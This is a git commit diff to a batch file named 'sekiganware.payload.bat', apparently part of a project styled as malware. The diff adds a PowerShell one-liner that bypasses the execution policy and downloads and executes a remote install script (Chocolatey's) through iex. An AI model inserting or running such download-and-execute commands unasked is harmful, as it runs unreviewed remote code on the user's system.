a72d5fa830cf6f54a2c03812642fed3839bf963b
zmansr <108787529+zmansr@users.noreply.github.com>
2022-07-06 09:35:10 +0200

    Update sekiganware.payload.bat

--- sekiganware.payload.bat
+++ sekiganware.payload.bat
@@ -1,6 +1,6 @@
 @echo off
 
-powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityPr  
+powershell -c Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 
 echo | set /p dummy="Reading environment variables from registry. Please wait... "
 goto main
